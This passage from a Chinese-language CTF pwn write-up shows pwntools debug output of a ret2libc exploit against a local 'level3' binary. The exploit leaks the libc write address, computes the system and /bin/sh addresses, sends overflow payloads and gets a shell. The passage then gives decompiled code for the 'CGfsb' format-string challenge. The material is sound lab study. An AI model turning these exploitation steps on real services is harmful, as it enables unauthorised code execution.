
```text
dc@ubuntu:~/playground/xctf_word/pwn/level3$ socat - TCP:127.0.0.1:10001
Input: 1
Hello, World!
dc@ubuntu:~/playground/xctf_word/pwn/level3$ python exp.py
[DEBUG] PLT 0x176b0 _Unwind_Find_FDE
[DEBUG] PLT 0x176c0 realloc
[DEBUG] PLT 0x176e0 memalign
[DEBUG] PLT 0x17710 _dl_find_dso_for_object
[DEBUG] PLT 0x17720 calloc
[DEBUG] PLT 0x17730 ___tls_get_addr
[DEBUG] PLT 0x17740 malloc
[DEBUG] PLT 0x17748 free
[*] '/home/dc/playground/xctf_word/pwn/level3/libc_32.so.6'
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
[DEBUG] PLT 0x8048310 read
[DEBUG] PLT 0x8048320 __gmon_start__
[DEBUG] PLT 0x8048330 __libc_start_main
[DEBUG] PLT 0x8048340 write
[*] '/home/dc/playground/xctf_word/pwn/level3/level3'
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8047000)
[+] Opening connection to 127.0.0.1 on port 10001: Done
[DEBUG] Received 0x7 bytes:
'Input:\n'
[DEBUG] Sent 0xa0 bytes:
00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
*
00000080 41 41 41 41 41 41 41 41 41 41 41 41 40 83 04 08  │AAAA│AAAA│AAAA│@···│
00000090 4b 84 04 08 01 00 00 00 18 a0 04 08 04 00 00 00  │K···│····│····│····│
000000a0
[DEBUG] Received 0xb bytes:
00000000 c0 43 ef f7 49 6e 70 75 74 3a 0a                  │·C··│Inpu│t:·│
0000000b
[*] real write address in libc is 0xf7ef43c0
[*] system address is 0xf7e5a940,/bin/sh address is 0xf7f7902b
[*] Paused (press any to continue)
[DEBUG] Sent 0x98 bytes:
00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
*
00000080 41 41 41 41 41 41 41 41 41 41 41 41 40 a9 e5 f7  │AAAA│AAAA│AAAA│@···│
00000090 ef be ad de 2b 90 f7 f7                            │····│+···│
00000098
[*] Switching to interactive mode
$ whoami
[DEBUG] Sent 0x7 bytes:
'whoami\n'
[DEBUG] Received 0x3 bytes:
'dc\n'
dc
$
```

## CGfsb

一个典型的字符串格式化漏洞，需要我们修改某个变量的值：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int buf; // [esp+1Eh] [ebp-7Eh]
  int v5; // [esp+22h] [ebp-7Ah]
  __int16 v6; // [esp+26h] [ebp-76h]
  char message; // [esp+28h] [ebp-74h]
  unsigned int v8; // [esp+8Ch] [ebp-10h]

  v8 = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  buf = 0;
  v5 = 0;
  v6 = 0;
  memset(&message, 0, 0x64u);
  puts("please tell me your name:");
  read(0, &buf, 0xAu);
  puts("leave your message please:");
  fgets(&message, 0x64, stdin);
  printf("hello %s", &buf);
  puts("your message is:");
  printf(&message);
  if ( pwnme == 8 )
  {
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
  }
  else
  {
    puts("Thank you!");
  }
  return 0;
}
```

## `gdb`调试：
